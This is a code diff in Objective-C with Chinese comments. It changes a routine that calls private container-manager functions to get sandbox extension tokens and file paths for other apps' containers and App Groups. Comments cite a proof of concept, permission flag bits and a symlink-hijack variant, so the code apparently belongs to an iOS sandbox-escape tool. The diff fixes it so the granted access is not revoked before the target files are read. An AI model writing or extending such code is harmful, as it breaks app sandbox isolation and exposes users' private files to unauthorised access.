@@ -485,18 +485,29 @@ static void OWQueryRelease(void *q) {
 
     void *xid = gXPCString ? gXPCString(identifier.UTF8String) : NULL;
 
-    static const uint64_t kFlags[] = {0x900000000ULL, 0x100000000ULL, 0x800000000ULL, 0x8000000000ULL};
-    static const uint64_t kParts[] = {0, 1, 2, 3, 4};
-    NSUInteger partCount = (cls == OWMCMClassAppGroup) ? 2 : 5; // group 只试 0 / 3
+    // flags 是「查询」与「激活」两个权限位的组合：
+    //   0x100000000 = bit32 查询（只给路径）
+    //   0x800000000 = bit35 App Group 访问
+    //   0x900000000 = 两者叠加 = 查询 + 签发 extension（MHA 路线正解）
+    // 其余两个值是 26.x / 旧版的兜底。
+    static const uint64_t kFlags[] = {0x900000000ULL, 0x100000000ULL,
+                                      0x800000000ULL, 0x8000000000ULL};
+    // part 只用 0（整个容器）。PoC / 3105 / 目标包都是 0。
+    // part 3 是 Library/Caches，只在 worse_query 的 symlink 劫持里有意义——
+    // 拿它当常规路径会得到子目录，后续按相对路径拼文件就全错了。
+    const uint64_t part = 0;
+    const NSUInteger partCount = 1;
 
     NSString *bestPath = nil, *bestIdent = nil, *bestToken = nil;
     BOOL bestActivated = NO, foundToken = NO;
     uint64_t hitPart = 0, hitFlags = 0;
     NSString *lastErrorMsg = nil;
+    // ★ Extension 绑在 container_object 上：object_free 会撤销它。
+    // 所以 activate 成功的那一份必须留到读完文件，由 OWMCMContainer.dealloc 释放。
+    void *retained = NULL;
 
     for (NSUInteger fi = 0; fi < 4 && !foundToken; fi++) {
         for (NSUInteger pi = 0; pi < partCount && !foundToken; pi++) {
-            uint64_t part = (cls == OWMCMClassAppGroup && pi == 1) ? 3 : kParts[pi];
             uint64_t flags = kFlags[fi];
 
             void *q = gOWMCMfns.query_create();
@@ -548,6 +559,7 @@ static void OWQueryRelease(void *q) {
                 activated = gOWMCMfns.object_sbx_activate(useObj, false);
             }
 
+            BOOL take = NO;
             if (path && path[0] == '/') {
                 NSString *p = [NSString stringWithUTF8String:path];
                 NSString *i2 = ident ? [NSString stringWithUTF8String:ident] : identifier;
@@ -559,13 +571,24 @@ static void OWQueryRelease(void *q) {
                     hitPart = part;
                     hitFlags = flags;
                     foundToken = YES;
+                    take = YES;
                 } else if (!bestPath) {
                     bestPath = p;
                     bestIdent = i2;
                     bestActivated = activated;
+                    take = YES;
                 }
             }
-            if (copied && gOWMCMfns.object_free) gOWMCMfns.object_free(copied);
+            // 激活成功的那份 object 必须留住（它持有 extension），其余立刻归还。
+            // 没有 activate 成功时，token 是独立字符串，object 可以安全释放。
+            if (take && activated && copied) {
+                if (retained && retained != copied && gOWMCMfns.object_free) {
+                    gOWMCMfns.object_free(retained);
+                }
+                retained = copied;
+            } else if (copied && copied != retained && gOWMCMfns.object_free) {
+                gOWMCMfns.object_free(copied);
+            }
             OWQueryRelease(q);
         }
     }
@@ -586,7 +609,9 @@ static void OWQueryRelease(void *q) {
     c.containerClass = cls;
     c.sandboxToken = bestToken;
     c.extensionActivated = bestActivated;
-    c.rawObject = NULL;
+    // ★ 不能置 NULL：activate 成功时 extension 由这个 object 持有，
+    // 释放它就等于撤销访问权（PoC: object_free revokes the extension）。
+    c.rawObject = retained;
     OWLog(@"OWMCM: 定向 %@ token=%d part=%llu flags=0x%llx %@",
           c.identifier, bestToken.length > 0,
           (unsigned long long)hitPart, (unsigned long long)hitFlags,
@@ -642,11 +667,13 @@ static void OWQueryRelease(void *q) {
         if (error) *error = [self errorWithStatus:OWMCMStatusBadArgument message:@"identifier 为空"];
         return nil;
     }
-    NSArray *r = [self containersOfClass:cls identifiers:@[identifier] error:error];
-    for (OWMCMContainer *c in r) {
-        if ([c.identifier isEqualToString:identifier]) return c;
+    if ([self prepare] != OWMCMStatusOK) {
+        if (error) *error = [self errorWithStatus:_prepared message:_lastError];
+        return nil;
     }
-    return r.firstObject;
+    // ★ 直接定向查询。MHA 路线一次只能查一个 identifier，
+    // 先跑一遍 containersOfClass 等于把全设备容器扫一遍再筛，纯浪费。
+    return [self _targetedContainerForClass:cls identifier:identifier error:error];
 }
 
 #pragma mark 名称
